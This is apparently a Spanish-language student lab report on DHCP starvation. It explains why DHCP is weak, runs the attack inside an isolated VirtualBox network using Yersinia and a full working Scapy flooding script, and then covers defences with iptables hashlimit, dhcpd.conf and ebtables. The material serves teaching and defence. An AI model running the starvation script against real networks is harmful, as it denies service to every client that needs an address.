# Investigacion-sobre-ataques-DHCP

DHCP funciona con el intercambio **DORA**: el cliente manda un **DHCPDISCOVER**, el servidor responde con un **DHCPOFFER**, el cliente pide la oferta con un **DHCPREQUEST** y el servidor confirma con un **DHCPACK**. El problema es que casi todo va por broadcast, así que cualquiera en el mismo segmento puede escuchar las peticiones o hacerse pasar por servidor.

## El campo chaddr

Dentro del paquete DHCP está el campo **chaddr**, que guarda la MAC del cliente. Aunque parezca igual que la MAC de Ethernet, no lo es: la de Ethernet está en capa 2 y **chaddr** va dentro del payload DHCP, en capa 7. El servidor usa **chaddr** para registrar la concesión, y como se puede modificar con herramientas como Scapy, un atacante puede pedir muchas IPs fingiendo MACs distintas.

## Falta de autenticación

El RFC 2131 no obliga a autenticar ni cifrar DHCP. Cualquier host puede responder a un DISCOVER o lanzar miles de peticiones. El RFC 3118 propuso autenticación, pero casi no se usa porque complica la configuración y muchos dispositivos no lo soportan.

## DHCP Starvation

El ataque de *Starvation* busca agotar el pool de IPs. El atacante envía muchos DHCPDISCOVER con **chaddr** falsos y el servidor reserva una IP por cada uno. Si además falsifica la MAC de Ethernet, cada paquete parece venir de un equipo distinto, lo que dificulta que un switch lo detecte.

Herramientas como **Yersinia** o **Scapy** permiten automatizar esto. Con Scapy, por ejemplo, se puede crear un script que genere cientos de peticiones con MACs aleatorias en segundos.

## Lease time y consecuencias

El tiempo de concesión marca cuánto dura el daño. Con un lease de 7 días, las IPs quedan reservadas una semana aunque el atacante se desconecte. Con uno de 5 minutos, el efecto desaparece rápido.

Cuando el pool se agota, los equipos nuevos no reciben IP y algunos se autoconfiguran con una dirección **APIPA** (169.254.x.x). Estas IPs solo sirven para comunicación local, sin Internet ni acceso a otras redes.

## Mitigaciones

En switches gestionables, **DHCP Snooping** distingue puertos *trusted* (servidores legítimos) de *untrusted* (el resto). Si alguien en un puerto *untrusted* intenta enviar un DHCPOFFER, se bloquea. El switch además guarda una tabla con MAC, IP, puerto y tiempo de concesión.

**Port Security** limita cuántas MACs puede aprender un puerto, cortando ataques que usan muchas MACs falsas desde el mismo sitio.

En VirtualBox, sin switch físico, se puede proteger el servidor Linux con **iptables** y el módulo **hashlimit**, que limita la tasa de peticiones DHCPDISCOVER. **ebtables**, que filtra a nivel de capa 2, permite comprobar que la MAC de la trama coincide con el **chaddr** del paquete DHCP.

## Consideraciones finales

El modo promiscuo en VirtualBox permite recibir tramas con MACs que no son la propia. Sin él, Scapy puede enviar paquetes con MACs falsas, pero no recibirá las respuestas destinadas a esas MACs.

Estas pruebas solo son legales en entornos controlados y con autorización. En España, hacer un ataque DoS sin permiso puede constituir un delito según los artículos 264 y 264 bis del Código Penal, con penas de prisión y multa.

En resumen, DHCP es cómodo pero frágil si no se protege. Combinar DHCP Snooping, Port Security, límites con iptables/ebtables y leases razonables reduce mucho el riesgo.


# Simulación de DHCP Starvation

El objetivo de esta práctica es ver cómo un atacante puede agotar el pool de IPs de un servidor DHCP y qué defensas se pueden aplicar. Para ello se monta una red interna en VirtualBox con tres máquinas: un Kali Linux como atacante, un Debian/Ubuntu como servidor DHCP y un cliente Ubuntu/Debian.

## Preparación del entorno

Las tres VMs se configuran en **Red Interna** con el modo promiscuo en **Permitir todo**. Esto es necesario para que Kali pueda enviar y recibir tramas con MACs falsas. El servidor además tiene un adaptador NAT para poder instalar paquetes como `isc-dhcp-server`.

Antes de atacar, se comprueba que el cliente recibe IP correctamente con:

```bash
sudo dhclient -v enp0s3
ip a
```

En el servidor se pueden ver las concesiones activas con:

```bash
cat /var/lib/dhcp/dhcpd.leases
```

## Ataque con Yersinia

Yersinia es una herramienta para probar protocolos de capa 2, entre ellos DHCP. En Kali se instala y se lanza en modo interactivo:

```bash
sudo apt update && sudo apt install -y yersinia
sudo yersinia -I
```

Dentro de la herramienta, se pulsa `g` para elegir DHCP y luego `x` para ver los ataques. Se selecciona la opción de enviar paquetes DISCOVER y se deja actuar unos 15 segundos antes de parar con `L`. El resultado es una ráfaga de peticiones con MACs aleatorias.

## Ataque con Scapy

Scapy permite crear paquetes a mano con Python. La ventaja frente a Yersinia es que se puede controlar tanto la MAC de Ethernet (capa 2) como el campo **chaddr** del payload DHCP (capa 7). El script genera un bucle que envía DHCPDISCOVER con MACs aleatorias en ambas capas:

```python
#!/usr/bin/env python3
import time
from scapy.all import *

conf.verb = 0
interface = "eth0"

print(f"[*] Lanzando DHCP Starvation sobre {interface}...")

try:
    while True:
        rand_mac = RandMAC()
        mac_bytes = mac2str(rand_mac)

        pkt = (Ether(dst="ff:ff:ff:ff:ff:ff", src=rand_mac) /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(chaddr=mac_bytes, xid=RandInt()) /
               DHCP(options=[("message-type", "discover"), "end"]))

        sendp(pkt, iface=interface, count=1)
        time.sleep(0.005)

except KeyboardInterrupt:
    print("\nAtaque finalizado.")
```

Se ejecuta con `sudo python3 starvation.py`.

## Validación del impacto

En el servidor se cuenta cuántas leases se han asignado:

```bash
cat /var/lib/dhcp/dhcpd.leases | grep "lease " | wc -l
```

En pocos segundos el pool se llena. Si en el cliente se libera la IP y se pide otra:

```bash
sudo dhclient -r eth0
sudo dhclient -v eth0
```

El cliente se queda en bucle enviando DHCPDISCOVER sin recibir respuesta. La red queda inutilizable para nuevos equipos.

## Mitigación con iptables

En el servidor se puede limitar la tasa de peticiones DHCP con el módulo `hashlimit`. La regla siguiente permite un máximo de 3 peticiones por segundo por MAC, con un burst de 5:

```bash
sudo iptables -A INPUT -i eth1 -p udp --dport 67 \
  -m hashlimit --hashlimit-name dhcp_limit \
  --hashlimit-above 3/sec --hashlimit-burst 5 \
  --hashlimit-mode srcmac --hashlimit-htable-expire 10000 \
  -j DROP
```

Con esto, la inundación de paquetes se corta en la primera línea de defensa. Se puede comprobar con:

```bash
sudo iptables -L INPUT -v -n
```

## Mitigación contra chaddr spoofing

Para evitar que un atacante cambie solo el campo **chaddr** manteniendo la misma MAC de Ethernet, se puede añadir en `/etc/dhcp/dhcpd.conf`:

```bash
deny unknown-clients;
```

Esto obliga a que solo clientes conocidos obtengan IP. Otra opción es usar **ebtables**, que filtra a nivel de capa 2 y permite comprobar que la MAC de la trama coincide con el **chaddr** del paquete DHCP.

## Respuestas a las preguntas

**¿Por qué hay que alterar MAC Ethernet y chaddr a la vez?**  
Porque si solo se cambia uno, el sistema puede detectar la incongruencia. Si se cambian ambos, cada petición parece venir de un cliente distinto y es más difícil de filtrar.

**¿Funcionaría sin modo promiscuo?**  
No del todo. Kali podría enviar los paquetes, pero no recibiría las respuestas destinadas a las MACs falsas, así que el ataque pierde eficacia.

**¿Cómo usaría ebtables en un bridge?**  
Se puede crear una regla que descarte tramas donde la MAC de origen de Ethernet no coincida con el campo **chaddr** del payload DHCP. Esto bloquea el spoofing en capa 2.

**¿Qué pasa si el atacante falsifica miles de MACs distintas?**  
La regla de `hashlimit` por `srcmac` pierde eficacia, porque cada paquete parece venir de una MAC diferente. En ese caso, la mejor defensa es **Port Security** en el switch, limitando cuántas MACs puede aprender un mismo puerto físico.

## Conclusión

DHCP Starvation es un ataque sencillo pero efectivo si no hay defensas. La combinación de rate limiting con iptables, filtrado con ebtables y controles de puerto en el switch reduce mucho el riesgo. En un entorno virtual como VirtualBox, todo debe quedar dentro de una red interna aislada.
